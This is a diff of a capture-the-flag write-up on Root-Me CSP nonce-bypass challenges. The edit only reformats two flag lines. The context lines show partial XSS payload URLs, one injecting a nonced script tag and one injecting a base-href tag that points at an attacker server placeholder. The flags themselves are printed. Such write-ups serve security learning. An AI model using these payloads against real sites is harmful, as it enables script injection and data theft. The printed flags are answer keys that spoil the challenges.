@@ -124,7 +124,9 @@ http://challenge01.root-me.org/web-client/ch49/?username=<script+nonce%3DPHNjcml
 
 ![csp-bypass---nonce-6.png](/assets/ctf/root-me/csp-bypass-nonce-6.png)
 
-> Flag: `rootme{CSP_BYP455_n0nC3}`
+::: tip Flag
+`rootme{CSP_BYP455_n0nC3}`
+:::
 
 ## Nonce 2
 
@@ -188,5 +190,7 @@ http://challenge01.root-me.org/web-client/ch62/#</p><base%20href="http://YOUR_SE
 
 ![csp-bypass---nonce-9.png](/assets/ctf/root-me/csp-bypass-nonce-9.png)
 
-> Flag: `rootme{d0nt_f0rg3t_b4se_uR1}`
+::: tip Flag
+`rootme{d0nt_f0rg3t_b4se_uR1}`
+:::
 
